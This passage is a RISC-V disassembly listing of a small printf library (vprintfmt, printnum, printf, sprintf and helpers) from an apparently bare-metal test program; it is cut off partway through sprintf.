    800077a0:	0ff7f793          	zext.b	a5,a5
    800077a4:	00f7f793          	and	a5,a5,15
    800077a8:	0ff7f713          	zext.b	a4,a5
    800077ac:	fc843783          	ld	a5,-56(s0)
    800077b0:	00f7f693          	and	a3,a5,15
    800077b4:	00900793          	li	a5,9
    800077b8:	00d7e663          	bltu	a5,a3,800077c4 <printhex+0x44>
    800077bc:	03000793          	li	a5,48
    800077c0:	0080006f          	j	800077c8 <printhex+0x48>
    800077c4:	05700793          	li	a5,87
    800077c8:	00f00693          	li	a3,15
    800077cc:	fec42603          	lw	a2,-20(s0)
    800077d0:	40c686bb          	subw	a3,a3,a2
    800077d4:	0006869b          	sext.w	a3,a3
    800077d8:	00e787bb          	addw	a5,a5,a4
    800077dc:	0ff7f713          	zext.b	a4,a5
    800077e0:	ff068793          	add	a5,a3,-16
    800077e4:	008787b3          	add	a5,a5,s0
    800077e8:	fee78423          	sb	a4,-24(a5)
    800077ec:	fc843783          	ld	a5,-56(s0)
    800077f0:	0047d793          	srl	a5,a5,0x4
    800077f4:	fcf43423          	sd	a5,-56(s0)
    800077f8:	fec42783          	lw	a5,-20(s0)
    800077fc:	0017879b          	addw	a5,a5,1
    80007800:	fef42623          	sw	a5,-20(s0)
    80007804:	fec42783          	lw	a5,-20(s0)
    80007808:	0007871b          	sext.w	a4,a5
    8000780c:	00f00793          	li	a5,15
    80007810:	f8e7d6e3          	bge	a5,a4,8000779c <printhex+0x1c>
    80007814:	fe040423          	sb	zero,-24(s0)
    80007818:	fd840793          	add	a5,s0,-40
    8000781c:	00078513          	mv	a0,a5
    80007820:	e79ff0ef          	jal	80007698 <printstr>
    80007824:	00000013          	nop
    80007828:	03813083          	ld	ra,56(sp)
    8000782c:	03013403          	ld	s0,48(sp)
    80007830:	04010113          	add	sp,sp,64
    80007834:	00008067          	ret

0000000080007838 <printnum>:
    80007838:	eb010113          	add	sp,sp,-336
    8000783c:	14113423          	sd	ra,328(sp)
    80007840:	14813023          	sd	s0,320(sp)
    80007844:	15010413          	add	s0,sp,336
    80007848:	eca43c23          	sd	a0,-296(s0)
    8000784c:	ecb43823          	sd	a1,-304(s0)
    80007850:	ecc43423          	sd	a2,-312(s0)
    80007854:	00068613          	mv	a2,a3
    80007858:	00070693          	mv	a3,a4
    8000785c:	00078713          	mv	a4,a5
    80007860:	00060793          	mv	a5,a2
    80007864:	ecf42223          	sw	a5,-316(s0)
    80007868:	00068793          	mv	a5,a3
    8000786c:	ecf42023          	sw	a5,-320(s0)
    80007870:	00070793          	mv	a5,a4
    80007874:	eaf42e23          	sw	a5,-324(s0)
    80007878:	fe042623          	sw	zero,-20(s0)
    8000787c:	ec446783          	lwu	a5,-316(s0)
    80007880:	ec843703          	ld	a4,-312(s0)
    80007884:	02f776b3          	remu	a3,a4,a5
    80007888:	fec42783          	lw	a5,-20(s0)
    8000788c:	0017871b          	addw	a4,a5,1
    80007890:	fee42623          	sw	a4,-20(s0)
    80007894:	0006871b          	sext.w	a4,a3
    80007898:	00279793          	sll	a5,a5,0x2
    8000789c:	ff078793          	add	a5,a5,-16
    800078a0:	008787b3          	add	a5,a5,s0
    800078a4:	eee7ac23          	sw	a4,-264(a5)
    800078a8:	ec446783          	lwu	a5,-316(s0)
    800078ac:	ec843703          	ld	a4,-312(s0)
    800078b0:	00f76c63          	bltu	a4,a5,800078c8 <printnum+0x90>
    800078b4:	ec446783          	lwu	a5,-316(s0)
    800078b8:	ec843703          	ld	a4,-312(s0)
    800078bc:	02f757b3          	divu	a5,a4,a5
    800078c0:	ecf43423          	sd	a5,-312(s0)
    800078c4:	fb9ff06f          	j	8000787c <printnum+0x44>
    800078c8:	00000013          	nop
    800078cc:	0180006f          	j	800078e4 <printnum+0xac>
    800078d0:	ebc42703          	lw	a4,-324(s0)
    800078d4:	ed843783          	ld	a5,-296(s0)
    800078d8:	ed043583          	ld	a1,-304(s0)
    800078dc:	00070513          	mv	a0,a4
    800078e0:	000780e7          	jalr	a5
    800078e4:	ec042783          	lw	a5,-320(s0)
    800078e8:	fff7871b          	addw	a4,a5,-1
    800078ec:	ece42023          	sw	a4,-320(s0)
    800078f0:	fec42703          	lw	a4,-20(s0)
    800078f4:	0007071b          	sext.w	a4,a4
    800078f8:	fcf74ce3          	blt	a4,a5,800078d0 <printnum+0x98>
    800078fc:	0600006f          	j	8000795c <printnum+0x124>
    80007900:	fec42783          	lw	a5,-20(s0)
    80007904:	00279793          	sll	a5,a5,0x2
    80007908:	ff078793          	add	a5,a5,-16
    8000790c:	008787b3          	add	a5,a5,s0
    80007910:	ef87a703          	lw	a4,-264(a5)
    80007914:	fec42783          	lw	a5,-20(s0)
    80007918:	00279793          	sll	a5,a5,0x2
    8000791c:	ff078793          	add	a5,a5,-16
    80007920:	008787b3          	add	a5,a5,s0
    80007924:	ef87a783          	lw	a5,-264(a5)
    80007928:	00078693          	mv	a3,a5
    8000792c:	00900793          	li	a5,9
    80007930:	00d7f663          	bgeu	a5,a3,8000793c <printnum+0x104>
    80007934:	05700793          	li	a5,87
    80007938:	0080006f          	j	80007940 <printnum+0x108>
    8000793c:	03000793          	li	a5,48
    80007940:	00e787bb          	addw	a5,a5,a4
    80007944:	0007879b          	sext.w	a5,a5
    80007948:	0007871b          	sext.w	a4,a5
    8000794c:	ed843783          	ld	a5,-296(s0)
    80007950:	ed043583          	ld	a1,-304(s0)
    80007954:	00070513          	mv	a0,a4
    80007958:	000780e7          	jalr	a5
    8000795c:	fec42783          	lw	a5,-20(s0)
    80007960:	fff7871b          	addw	a4,a5,-1
    80007964:	fee42623          	sw	a4,-20(s0)
    80007968:	f8f04ce3          	bgtz	a5,80007900 <printnum+0xc8>
    8000796c:	00000013          	nop
    80007970:	00000013          	nop
    80007974:	14813083          	ld	ra,328(sp)
    80007978:	14013403          	ld	s0,320(sp)
    8000797c:	15010113          	add	sp,sp,336
    80007980:	00008067          	ret

0000000080007984 <getuint>:
    80007984:	fe010113          	add	sp,sp,-32
    80007988:	00813c23          	sd	s0,24(sp)
    8000798c:	02010413          	add	s0,sp,32
    80007990:	fea43423          	sd	a0,-24(s0)
    80007994:	00058793          	mv	a5,a1
    80007998:	fef42223          	sw	a5,-28(s0)
    8000799c:	fe442783          	lw	a5,-28(s0)
    800079a0:	0007871b          	sext.w	a4,a5
    800079a4:	00100793          	li	a5,1
    800079a8:	02e7d063          	bge	a5,a4,800079c8 <getuint+0x44>
    800079ac:	fe843783          	ld	a5,-24(s0)
    800079b0:	0007b783          	ld	a5,0(a5)
    800079b4:	00878693          	add	a3,a5,8
    800079b8:	fe843703          	ld	a4,-24(s0)
    800079bc:	00d73023          	sd	a3,0(a4)
    800079c0:	0007b783          	ld	a5,0(a5)
    800079c4:	04c0006f          	j	80007a10 <getuint+0x8c>
    800079c8:	fe442783          	lw	a5,-28(s0)
    800079cc:	0007879b          	sext.w	a5,a5
    800079d0:	02078063          	beqz	a5,800079f0 <getuint+0x6c>
    800079d4:	fe843783          	ld	a5,-24(s0)
    800079d8:	0007b783          	ld	a5,0(a5)
    800079dc:	00878693          	add	a3,a5,8
    800079e0:	fe843703          	ld	a4,-24(s0)
    800079e4:	00d73023          	sd	a3,0(a4)
    800079e8:	0007b783          	ld	a5,0(a5)
    800079ec:	0240006f          	j	80007a10 <getuint+0x8c>
    800079f0:	fe843783          	ld	a5,-24(s0)
    800079f4:	0007b783          	ld	a5,0(a5)
    800079f8:	00878693          	add	a3,a5,8
    800079fc:	fe843703          	ld	a4,-24(s0)
    80007a00:	00d73023          	sd	a3,0(a4)
    80007a04:	0007a783          	lw	a5,0(a5)
    80007a08:	02079793          	sll	a5,a5,0x20
    80007a0c:	0207d793          	srl	a5,a5,0x20
    80007a10:	00078513          	mv	a0,a5
    80007a14:	01813403          	ld	s0,24(sp)
    80007a18:	02010113          	add	sp,sp,32
    80007a1c:	00008067          	ret

0000000080007a20 <getint>:
    80007a20:	fe010113          	add	sp,sp,-32
    80007a24:	00813c23          	sd	s0,24(sp)
    80007a28:	02010413          	add	s0,sp,32
    80007a2c:	fea43423          	sd	a0,-24(s0)
    80007a30:	00058793          	mv	a5,a1
    80007a34:	fef42223          	sw	a5,-28(s0)
    80007a38:	fe442783          	lw	a5,-28(s0)
    80007a3c:	0007871b          	sext.w	a4,a5
    80007a40:	00100793          	li	a5,1
    80007a44:	02e7d063          	bge	a5,a4,80007a64 <getint+0x44>
    80007a48:	fe843783          	ld	a5,-24(s0)
    80007a4c:	0007b783          	ld	a5,0(a5)
    80007a50:	00878693          	add	a3,a5,8
    80007a54:	fe843703          	ld	a4,-24(s0)
    80007a58:	00d73023          	sd	a3,0(a4)
    80007a5c:	0007b783          	ld	a5,0(a5)
    80007a60:	0440006f          	j	80007aa4 <getint+0x84>
    80007a64:	fe442783          	lw	a5,-28(s0)
    80007a68:	0007879b          	sext.w	a5,a5
    80007a6c:	02078063          	beqz	a5,80007a8c <getint+0x6c>
    80007a70:	fe843783          	ld	a5,-24(s0)
    80007a74:	0007b783          	ld	a5,0(a5)
    80007a78:	00878693          	add	a3,a5,8
    80007a7c:	fe843703          	ld	a4,-24(s0)
    80007a80:	00d73023          	sd	a3,0(a4)
    80007a84:	0007b783          	ld	a5,0(a5)
    80007a88:	01c0006f          	j	80007aa4 <getint+0x84>
    80007a8c:	fe843783          	ld	a5,-24(s0)
    80007a90:	0007b783          	ld	a5,0(a5)
    80007a94:	00878693          	add	a3,a5,8
    80007a98:	fe843703          	ld	a4,-24(s0)
    80007a9c:	00d73023          	sd	a3,0(a4)
    80007aa0:	0007a783          	lw	a5,0(a5)
    80007aa4:	00078513          	mv	a0,a5
    80007aa8:	01813403          	ld	s0,24(sp)
    80007aac:	02010113          	add	sp,sp,32
    80007ab0:	00008067          	ret

0000000080007ab4 <vprintfmt>:
    80007ab4:	f9010113          	add	sp,sp,-112
    80007ab8:	06113423          	sd	ra,104(sp)
    80007abc:	06813023          	sd	s0,96(sp)
    80007ac0:	04913c23          	sd	s1,88(sp)
    80007ac4:	05213823          	sd	s2,80(sp)
    80007ac8:	07010413          	add	s0,sp,112
    80007acc:	faa43423          	sd	a0,-88(s0)
    80007ad0:	fab43023          	sd	a1,-96(s0)
    80007ad4:	f8c43c23          	sd	a2,-104(s0)
    80007ad8:	f8d43823          	sd	a3,-112(s0)
    80007adc:	0240006f          	j	80007b00 <vprintfmt+0x4c>
    80007ae0:	3e048c63          	beqz	s1,80007ed8 <vprintfmt+0x424>
    80007ae4:	f9843783          	ld	a5,-104(s0)
    80007ae8:	00178793          	add	a5,a5,1
    80007aec:	f8f43c23          	sd	a5,-104(s0)
    80007af0:	fa843783          	ld	a5,-88(s0)
    80007af4:	fa043583          	ld	a1,-96(s0)
    80007af8:	00048513          	mv	a0,s1
    80007afc:	000780e7          	jalr	a5
    80007b00:	f9843783          	ld	a5,-104(s0)
    80007b04:	0007c783          	lbu	a5,0(a5)
    80007b08:	0007849b          	sext.w	s1,a5
    80007b0c:	00048713          	mv	a4,s1
    80007b10:	02500793          	li	a5,37
    80007b14:	fcf716e3          	bne	a4,a5,80007ae0 <vprintfmt+0x2c>
    80007b18:	f9843783          	ld	a5,-104(s0)
    80007b1c:	00178793          	add	a5,a5,1
    80007b20:	f8f43c23          	sd	a5,-104(s0)
    80007b24:	f9843783          	ld	a5,-104(s0)
    80007b28:	faf43c23          	sd	a5,-72(s0)
    80007b2c:	02000793          	li	a5,32
    80007b30:	fcf403a3          	sb	a5,-57(s0)
    80007b34:	fff00793          	li	a5,-1
    80007b38:	fcf42623          	sw	a5,-52(s0)
    80007b3c:	fff00793          	li	a5,-1
    80007b40:	fcf42423          	sw	a5,-56(s0)
    80007b44:	fc042823          	sw	zero,-48(s0)
    80007b48:	fa042a23          	sw	zero,-76(s0)
    80007b4c:	0100006f          	j	80007b5c <vprintfmt+0xa8>
    80007b50:	00000013          	nop
    80007b54:	0080006f          	j	80007b5c <vprintfmt+0xa8>
    80007b58:	00000013          	nop
    80007b5c:	f9843783          	ld	a5,-104(s0)
    80007b60:	00178713          	add	a4,a5,1
    80007b64:	f8e43c23          	sd	a4,-104(s0)
    80007b68:	0007c783          	lbu	a5,0(a5)
    80007b6c:	0007849b          	sext.w	s1,a5
    80007b70:	fdd4869b          	addw	a3,s1,-35
    80007b74:	0006871b          	sext.w	a4,a3
    80007b78:	05500793          	li	a5,85
    80007b7c:	32e7ee63          	bltu	a5,a4,80007eb8 <vprintfmt+0x404>
    80007b80:	02069793          	sll	a5,a3,0x20
    80007b84:	0207d793          	srl	a5,a5,0x20
    80007b88:	00279713          	sll	a4,a5,0x2
    80007b8c:	001f8797          	auipc	a5,0x1f8
    80007b90:	49478793          	add	a5,a5,1172 # 80200020 <attack_end+0x18>
    80007b94:	00f707b3          	add	a5,a4,a5
    80007b98:	0007a783          	lw	a5,0(a5)
    80007b9c:	0007871b          	sext.w	a4,a5
    80007ba0:	001f8797          	auipc	a5,0x1f8
    80007ba4:	48078793          	add	a5,a5,1152 # 80200020 <attack_end+0x18>
    80007ba8:	00f707b3          	add	a5,a4,a5
    80007bac:	00078067          	jr	a5
    80007bb0:	02d00793          	li	a5,45
    80007bb4:	fcf403a3          	sb	a5,-57(s0)
    80007bb8:	fa5ff06f          	j	80007b5c <vprintfmt+0xa8>
    80007bbc:	03000793          	li	a5,48
    80007bc0:	fcf403a3          	sb	a5,-57(s0)
    80007bc4:	f99ff06f          	j	80007b5c <vprintfmt+0xa8>
    80007bc8:	fc042423          	sw	zero,-56(s0)
    80007bcc:	fc842783          	lw	a5,-56(s0)
    80007bd0:	00078713          	mv	a4,a5
    80007bd4:	00070793          	mv	a5,a4
    80007bd8:	0027979b          	sllw	a5,a5,0x2
    80007bdc:	00e787bb          	addw	a5,a5,a4
    80007be0:	0017979b          	sllw	a5,a5,0x1
    80007be4:	0007879b          	sext.w	a5,a5
    80007be8:	00f487bb          	addw	a5,s1,a5
    80007bec:	0007879b          	sext.w	a5,a5
    80007bf0:	fd07879b          	addw	a5,a5,-48
    80007bf4:	fcf42423          	sw	a5,-56(s0)
    80007bf8:	f9843783          	ld	a5,-104(s0)
    80007bfc:	0007c783          	lbu	a5,0(a5)
    80007c00:	0007849b          	sext.w	s1,a5
    80007c04:	00048713          	mv	a4,s1
    80007c08:	02f00793          	li	a5,47
    80007c0c:	04e7dc63          	bge	a5,a4,80007c64 <vprintfmt+0x1b0>
    80007c10:	00048713          	mv	a4,s1
    80007c14:	03900793          	li	a5,57
    80007c18:	04e7c663          	blt	a5,a4,80007c64 <vprintfmt+0x1b0>
    80007c1c:	f9843783          	ld	a5,-104(s0)
    80007c20:	00178793          	add	a5,a5,1
    80007c24:	f8f43c23          	sd	a5,-104(s0)
    80007c28:	fa5ff06f          	j	80007bcc <vprintfmt+0x118>
    80007c2c:	f9043783          	ld	a5,-112(s0)
    80007c30:	00878713          	add	a4,a5,8
    80007c34:	f8e43823          	sd	a4,-112(s0)
    80007c38:	0007a783          	lw	a5,0(a5)
    80007c3c:	fcf42423          	sw	a5,-56(s0)
    80007c40:	0280006f          	j	80007c68 <vprintfmt+0x1b4>
    80007c44:	fcc42783          	lw	a5,-52(s0)
    80007c48:	0007879b          	sext.w	a5,a5
    80007c4c:	f007d2e3          	bgez	a5,80007b50 <vprintfmt+0x9c>
    80007c50:	fc042623          	sw	zero,-52(s0)
    80007c54:	efdff06f          	j	80007b50 <vprintfmt+0x9c>
    80007c58:	00100793          	li	a5,1
    80007c5c:	faf42a23          	sw	a5,-76(s0)
    80007c60:	efdff06f          	j	80007b5c <vprintfmt+0xa8>
    80007c64:	00000013          	nop
    80007c68:	fcc42783          	lw	a5,-52(s0)
    80007c6c:	0007879b          	sext.w	a5,a5
    80007c70:	ee07d4e3          	bgez	a5,80007b58 <vprintfmt+0xa4>
    80007c74:	fc842783          	lw	a5,-56(s0)
    80007c78:	fcf42623          	sw	a5,-52(s0)
    80007c7c:	fff00793          	li	a5,-1
    80007c80:	fcf42423          	sw	a5,-56(s0)
    80007c84:	ed5ff06f          	j	80007b58 <vprintfmt+0xa4>
    80007c88:	fd042783          	lw	a5,-48(s0)
    80007c8c:	0017879b          	addw	a5,a5,1
    80007c90:	fcf42823          	sw	a5,-48(s0)
    80007c94:	ec9ff06f          	j	80007b5c <vprintfmt+0xa8>
    80007c98:	f9043783          	ld	a5,-112(s0)
    80007c9c:	00878713          	add	a4,a5,8
    80007ca0:	f8e43823          	sd	a4,-112(s0)
    80007ca4:	0007a703          	lw	a4,0(a5)
    80007ca8:	fa843783          	ld	a5,-88(s0)
    80007cac:	fa043583          	ld	a1,-96(s0)
    80007cb0:	00070513          	mv	a0,a4
    80007cb4:	000780e7          	jalr	a5
    80007cb8:	21c0006f          	j	80007ed4 <vprintfmt+0x420>
    80007cbc:	f9043783          	ld	a5,-112(s0)
    80007cc0:	00878713          	add	a4,a5,8
    80007cc4:	f8e43823          	sd	a4,-112(s0)
    80007cc8:	0007b903          	ld	s2,0(a5)
    80007ccc:	00091663          	bnez	s2,80007cd8 <vprintfmt+0x224>
    80007cd0:	001f8917          	auipc	s2,0x1f8
    80007cd4:	34890913          	add	s2,s2,840 # 80200018 <attack_end+0x10>
    80007cd8:	fcc42783          	lw	a5,-52(s0)
    80007cdc:	0007879b          	sext.w	a5,a5
    80007ce0:	08f05a63          	blez	a5,80007d74 <vprintfmt+0x2c0>
    80007ce4:	fc744783          	lbu	a5,-57(s0)
    80007ce8:	0ff7f713          	zext.b	a4,a5
    80007cec:	02d00793          	li	a5,45
    80007cf0:	08f70263          	beq	a4,a5,80007d74 <vprintfmt+0x2c0>
    80007cf4:	fcc42483          	lw	s1,-52(s0)
    80007cf8:	fc842783          	lw	a5,-56(s0)
    80007cfc:	00078593          	mv	a1,a5
    80007d00:	00090513          	mv	a0,s2
    80007d04:	5dc000ef          	jal	800082e0 <strnlen>
    80007d08:	00050793          	mv	a5,a0
    80007d0c:	0007879b          	sext.w	a5,a5
    80007d10:	40f487bb          	subw	a5,s1,a5
    80007d14:	0007879b          	sext.w	a5,a5
    80007d18:	fcf42623          	sw	a5,-52(s0)
    80007d1c:	0280006f          	j	80007d44 <vprintfmt+0x290>
    80007d20:	fc744783          	lbu	a5,-57(s0)
    80007d24:	0007871b          	sext.w	a4,a5
    80007d28:	fa843783          	ld	a5,-88(s0)
    80007d2c:	fa043583          	ld	a1,-96(s0)
    80007d30:	00070513          	mv	a0,a4
    80007d34:	000780e7          	jalr	a5
    80007d38:	fcc42783          	lw	a5,-52(s0)
    80007d3c:	fff7879b          	addw	a5,a5,-1
    80007d40:	fcf42623          	sw	a5,-52(s0)
    80007d44:	fcc42783          	lw	a5,-52(s0)
    80007d48:	0007879b          	sext.w	a5,a5
    80007d4c:	fcf04ae3          	bgtz	a5,80007d20 <vprintfmt+0x26c>
    80007d50:	0240006f          	j	80007d74 <vprintfmt+0x2c0>
    80007d54:	fa843783          	ld	a5,-88(s0)
    80007d58:	fa043583          	ld	a1,-96(s0)
    80007d5c:	00048513          	mv	a0,s1
    80007d60:	000780e7          	jalr	a5
    80007d64:	00190913          	add	s2,s2,1
    80007d68:	fcc42783          	lw	a5,-52(s0)
    80007d6c:	fff7879b          	addw	a5,a5,-1
    80007d70:	fcf42623          	sw	a5,-52(s0)
    80007d74:	00094783          	lbu	a5,0(s2)
    80007d78:	0007849b          	sext.w	s1,a5
    80007d7c:	04048463          	beqz	s1,80007dc4 <vprintfmt+0x310>
    80007d80:	fc842783          	lw	a5,-56(s0)
    80007d84:	0007879b          	sext.w	a5,a5
    80007d88:	fc07c6e3          	bltz	a5,80007d54 <vprintfmt+0x2a0>
    80007d8c:	fc842783          	lw	a5,-56(s0)
    80007d90:	fff7879b          	addw	a5,a5,-1
    80007d94:	fcf42423          	sw	a5,-56(s0)
    80007d98:	fc842783          	lw	a5,-56(s0)
    80007d9c:	0007879b          	sext.w	a5,a5
    80007da0:	fa07dae3          	bgez	a5,80007d54 <vprintfmt+0x2a0>
    80007da4:	0200006f          	j	80007dc4 <vprintfmt+0x310>
    80007da8:	fa843783          	ld	a5,-88(s0)
    80007dac:	fa043583          	ld	a1,-96(s0)
    80007db0:	02000513          	li	a0,32
    80007db4:	000780e7          	jalr	a5
    80007db8:	fcc42783          	lw	a5,-52(s0)
    80007dbc:	fff7879b          	addw	a5,a5,-1
    80007dc0:	fcf42623          	sw	a5,-52(s0)
    80007dc4:	fcc42783          	lw	a5,-52(s0)
    80007dc8:	0007879b          	sext.w	a5,a5
    80007dcc:	fcf04ee3          	bgtz	a5,80007da8 <vprintfmt+0x2f4>
    80007dd0:	1040006f          	j	80007ed4 <vprintfmt+0x420>
    80007dd4:	fd042703          	lw	a4,-48(s0)
    80007dd8:	f9040793          	add	a5,s0,-112
    80007ddc:	00070593          	mv	a1,a4
    80007de0:	00078513          	mv	a0,a5
    80007de4:	c3dff0ef          	jal	80007a20 <getint>
    80007de8:	00050793          	mv	a5,a0
    80007dec:	fcf43c23          	sd	a5,-40(s0)
    80007df0:	fd843783          	ld	a5,-40(s0)
    80007df4:	0207d063          	bgez	a5,80007e14 <vprintfmt+0x360>
    80007df8:	fa843783          	ld	a5,-88(s0)
    80007dfc:	fa043583          	ld	a1,-96(s0)
    80007e00:	02d00513          	li	a0,45
    80007e04:	000780e7          	jalr	a5
    80007e08:	fd843783          	ld	a5,-40(s0)
    80007e0c:	40f007b3          	neg	a5,a5
    80007e10:	fcf43c23          	sd	a5,-40(s0)
    80007e14:	00a00793          	li	a5,10
    80007e18:	fcf42a23          	sw	a5,-44(s0)
    80007e1c:	0640006f          	j	80007e80 <vprintfmt+0x3cc>
    80007e20:	00a00793          	li	a5,10
    80007e24:	fcf42a23          	sw	a5,-44(s0)
    80007e28:	0400006f          	j	80007e68 <vprintfmt+0x3b4>
    80007e2c:	00800793          	li	a5,8
    80007e30:	fcf42a23          	sw	a5,-44(s0)
    80007e34:	0340006f          	j	80007e68 <vprintfmt+0x3b4>
    80007e38:	00100793          	li	a5,1
    80007e3c:	fcf42823          	sw	a5,-48(s0)
    80007e40:	fa843783          	ld	a5,-88(s0)
    80007e44:	fa043583          	ld	a1,-96(s0)
    80007e48:	03000513          	li	a0,48
    80007e4c:	000780e7          	jalr	a5
    80007e50:	fa843783          	ld	a5,-88(s0)
    80007e54:	fa043583          	ld	a1,-96(s0)
    80007e58:	07800513          	li	a0,120
    80007e5c:	000780e7          	jalr	a5
    80007e60:	01000793          	li	a5,16
    80007e64:	fcf42a23          	sw	a5,-44(s0)
    80007e68:	fd042703          	lw	a4,-48(s0)
    80007e6c:	f9040793          	add	a5,s0,-112
    80007e70:	00070593          	mv	a1,a4
    80007e74:	00078513          	mv	a0,a5
    80007e78:	b0dff0ef          	jal	80007984 <getuint>
    80007e7c:	fca43c23          	sd	a0,-40(s0)
    80007e80:	fd442683          	lw	a3,-44(s0)
    80007e84:	fc744783          	lbu	a5,-57(s0)
    80007e88:	0007879b          	sext.w	a5,a5
    80007e8c:	fcc42703          	lw	a4,-52(s0)
    80007e90:	fd843603          	ld	a2,-40(s0)
    80007e94:	fa043583          	ld	a1,-96(s0)
    80007e98:	fa843503          	ld	a0,-88(s0)
    80007e9c:	99dff0ef          	jal	80007838 <printnum>
    80007ea0:	0340006f          	j	80007ed4 <vprintfmt+0x420>
    80007ea4:	fa843783          	ld	a5,-88(s0)
    80007ea8:	fa043583          	ld	a1,-96(s0)
    80007eac:	00048513          	mv	a0,s1
    80007eb0:	000780e7          	jalr	a5
    80007eb4:	0200006f          	j	80007ed4 <vprintfmt+0x420>
    80007eb8:	fa843783          	ld	a5,-88(s0)
    80007ebc:	fa043583          	ld	a1,-96(s0)
    80007ec0:	02500513          	li	a0,37
    80007ec4:	000780e7          	jalr	a5
    80007ec8:	fb843783          	ld	a5,-72(s0)
    80007ecc:	f8f43c23          	sd	a5,-104(s0)
    80007ed0:	00000013          	nop
    80007ed4:	c2dff06f          	j	80007b00 <vprintfmt+0x4c>
    80007ed8:	00000013          	nop
    80007edc:	06813083          	ld	ra,104(sp)
    80007ee0:	06013403          	ld	s0,96(sp)
    80007ee4:	05813483          	ld	s1,88(sp)
    80007ee8:	05013903          	ld	s2,80(sp)
    80007eec:	07010113          	add	sp,sp,112
    80007ef0:	00008067          	ret

0000000080007ef4 <printf>:
    80007ef4:	f9010113          	add	sp,sp,-112
    80007ef8:	02113423          	sd	ra,40(sp)
    80007efc:	02813023          	sd	s0,32(sp)
    80007f00:	03010413          	add	s0,sp,48
    80007f04:	fca43c23          	sd	a0,-40(s0)
    80007f08:	00b43423          	sd	a1,8(s0)
    80007f0c:	00c43823          	sd	a2,16(s0)
    80007f10:	00d43c23          	sd	a3,24(s0)
    80007f14:	02e43023          	sd	a4,32(s0)
    80007f18:	02f43423          	sd	a5,40(s0)
    80007f1c:	03043823          	sd	a6,48(s0)
    80007f20:	03143c23          	sd	a7,56(s0)
    80007f24:	04040793          	add	a5,s0,64
    80007f28:	fcf43823          	sd	a5,-48(s0)
    80007f2c:	fd043783          	ld	a5,-48(s0)
    80007f30:	fc878793          	add	a5,a5,-56
    80007f34:	fef43423          	sd	a5,-24(s0)
    80007f38:	fe843783          	ld	a5,-24(s0)
    80007f3c:	00078693          	mv	a3,a5
    80007f40:	fd843603          	ld	a2,-40(s0)
    80007f44:	00000593          	li	a1,0
    80007f48:	fffff517          	auipc	a0,0xfffff
    80007f4c:	7a450513          	add	a0,a0,1956 # 800076ec <putchar>
    80007f50:	b65ff0ef          	jal	80007ab4 <vprintfmt>
    80007f54:	00000793          	li	a5,0
    80007f58:	00078513          	mv	a0,a5
    80007f5c:	02813083          	ld	ra,40(sp)
    80007f60:	02013403          	ld	s0,32(sp)
    80007f64:	07010113          	add	sp,sp,112
    80007f68:	00008067          	ret

0000000080007f6c <sprintf_putch.0>:
    80007f6c:	fc010113          	add	sp,sp,-64
    80007f70:	02813c23          	sd	s0,56(sp)
    80007f74:	04010413          	add	s0,sp,64
    80007f78:	00050793          	mv	a5,a0
    80007f7c:	fcb43823          	sd	a1,-48(s0)
    80007f80:	fcf42e23          	sw	a5,-36(s0)
    80007f84:	fc743423          	sd	t2,-56(s0)
    80007f88:	fd043783          	ld	a5,-48(s0)
    80007f8c:	fef43423          	sd	a5,-24(s0)
    80007f90:	fe843783          	ld	a5,-24(s0)
    80007f94:	0007b783          	ld	a5,0(a5)
    80007f98:	fdc42703          	lw	a4,-36(s0)
    80007f9c:	0ff77713          	zext.b	a4,a4
    80007fa0:	00e78023          	sb	a4,0(a5)
    80007fa4:	fe843783          	ld	a5,-24(s0)
    80007fa8:	0007b783          	ld	a5,0(a5)
    80007fac:	00178713          	add	a4,a5,1
    80007fb0:	fe843783          	ld	a5,-24(s0)
    80007fb4:	00e7b023          	sd	a4,0(a5)
    80007fb8:	00000013          	nop
    80007fbc:	03813403          	ld	s0,56(sp)
    80007fc0:	04010113          	add	sp,sp,64
    80007fc4:	00008067          	ret

0000000080007fc8 <sprintf>:
    80007fc8:	ef010113          	add	sp,sp,-272
    80007fcc:	0c113c23          	sd	ra,216(sp)
    80007fd0:	0c813823          	sd	s0,208(sp)
    80007fd4:	0e010413          	add	s0,sp,224
    80007fd8:	f2a43c23          	sd	a0,-200(s0)
    80007fdc:	f2b43823          	sd	a1,-208(s0)
    80007fe0:	00c43023          	sd	a2,0(s0)
    80007fe4:	00d43423          	sd	a3,8(s0)
    80007fe8:	00e43823          	sd	a4,16(s0)
    80007fec:	00f43c23          	sd	a5,24(s0)
    80007ff0:	03043023          	sd	a6,32(s0)
    80007ff4:	03143423          	sd	a7,40(s0)
    80007ff8:	03040793          	add	a5,s0,48
    80007ffc:	f2f43423          	sd	a5,-216(s0)
    80008000:	f2843783          	ld	a5,-216(s0)
    80008004:	fcf43c23          	sd	a5,-40(s0)
    80008008:	f4840793          	add	a5,s0,-184
    8000800c:	f4840713          	add	a4,s0,-184
    80008010:	39700693          	li	a3,919
    80008014:	00d7a023          	sw	a3,0(a5)
    80008018:	0183b6b7          	lui	a3,0x183b
    8000801c:	28368693          	add	a3,a3,643 # 183b283 <threadsense.2+0x183b1ff>
    80008020:	00d7a223          	sw	a3,4(a5)
    80008024:	0103b6b7          	lui	a3,0x103b
    80008028:	38368693          	add	a3,a3,899 # 103b383 <threadsense.2+0x103b2ff>
    8000802c:	00d7a423          	sw	a3,8(a5)
    80008030:	000286b7          	lui	a3,0x28
    80008034:	06768693          	add	a3,a3,103 # 28067 <threadsense.2+0x27fe3>
    80008038:	00d7a623          	sw	a3,12(a5)
    8000803c:	00e7b823          	sd	a4,16(a5)
    80008040:	00000717          	auipc	a4,0x0
    80008044:	f2c70713          	add	a4,a4,-212 # 80007f6c <sprintf_putch.0>
    80008048:	00e7bc23          	sd	a4,24(a5)
    8000804c:	0000100f          	fence.i
    80008050:	f3843783          	ld	a5,-200(s0)
    80008054:	fef43423          	sd	a5,-24(s0)
    80008058:	03040793          	add	a5,s0,48
    8000805c:	f2f43423          	sd	a5,-216(s0)
    80008060:	f2843783          	ld	a5,-216(s0)
    80008064:	fd078793          	add	a5,a5,-48
    80008068:	fef43023          	sd	a5,-32(s0)
    8000806c:	fe043703          	ld	a4,-32(s0)
    80008070:	f4840793          	add	a5,s0,-184
    80008074:	00078513          	mv	a0,a5
    80008078:	f3840793          	add	a5,s0,-200
    8000807c:	00070693          	mv	a3,a4
    80008080:	f3043603          	ld	a2,-208(s0)
    80008084:	00078593          	mv	a1,a5
    80008088:	a2dff0ef          	jal	80007ab4 <vprintfmt>
    8000808c:	f3843783          	ld	a5,-200(s0)
    80008090:	00078023          	sb	zero,0(a5)
    80008094:	f3843703          	ld	a4,-200(s0)
    80008098:	fe843783          	ld	a5,-24(s0)
    8000809c:	40f707b3          	sub	a5,a4,a5
